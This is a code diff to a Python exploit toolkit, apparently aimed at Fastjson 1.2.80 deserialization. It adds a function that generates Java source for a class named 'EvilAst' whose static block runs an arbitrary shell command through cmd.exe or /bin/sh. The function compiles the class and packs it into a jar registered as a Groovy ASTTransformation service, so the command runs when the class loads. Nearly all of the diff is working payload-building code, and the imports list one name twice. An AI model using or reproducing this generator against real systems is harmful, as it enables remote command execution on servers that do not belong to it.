@@ -17,7 +17,7 @@ from fastjson_toolkit.poc.echo.compile import (
     build_echo_artifact,
     compile_java_source,
 )
-from fastjson_toolkit.poc.echo.source import DEFAULT_CMD_HEADER
+from fastjson_toolkit.poc.echo.source import DEFAULT_CMD_HEADER, java_string_literal, java_string_literal
 
 
 def _cp_join(*parts: str) -> str:
@@ -186,6 +186,55 @@ public class EvilAst implements ASTTransformation {
                 "fj1280.EvilAst\n",
             )
         return buf.getvalue(), echo
+
+
+def build_groovy_exec_jar(*, cmd: str = "id") -> bytes:
+    """生成 Groovy ASTTransformation SPI jar（静态块执行命令，无回显）。"""
+    cmd_lit = java_string_literal(cmd or "id")
+    evil_src = f"""\
+package fj1280;
+
+import org.codehaus.groovy.ast.ASTNode;
+import org.codehaus.groovy.control.CompilePhase;
+import org.codehaus.groovy.control.SourceUnit;
+import org.codehaus.groovy.transform.ASTTransformation;
+import org.codehaus.groovy.transform.GroovyASTTransformation;
+
+@GroovyASTTransformation(phase = CompilePhase.CONVERSION)
+public class EvilAst implements ASTTransformation {{
+    static {{
+        try {{
+            String os = System.getProperty("os.name", "").toLowerCase();
+            String[] cmds = os.contains("win")
+                ? new String[]{{"cmd.exe", "/c", "{cmd_lit}"}}
+                : new String[]{{"/bin/sh", "-c", "{cmd_lit}"}};
+            Runtime.getRuntime().exec(cmds);
+        }} catch (Throwable ignore) {{
+        }}
+    }}
+
+    @Override
+    public void visit(ASTNode[] nodes, SourceUnit source) {{
+    }}
+}}
+"""
+    with tempfile.TemporaryDirectory(prefix="fj-groovy-exec-") as td:
+        root = Path(td)
+        stub_cp = _compile_groovy_stubs(root / "stubs")
+        evil_bytes = compile_java_source(
+            evil_src,
+            "EvilAst",
+            classpath=stub_cp,
+            out_dir=root / "evil_out",
+        )
+        buf = io.BytesIO()
+        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
+            zf.writestr("fj1280/EvilAst.class", evil_bytes)
+            zf.writestr(
+                "META-INF/services/org.codehaus.groovy.transform.ASTTransformation",
+                "fj1280.EvilAst\n",
+            )
+        return buf.getvalue()
 
 
 def write_echo_attack_files(
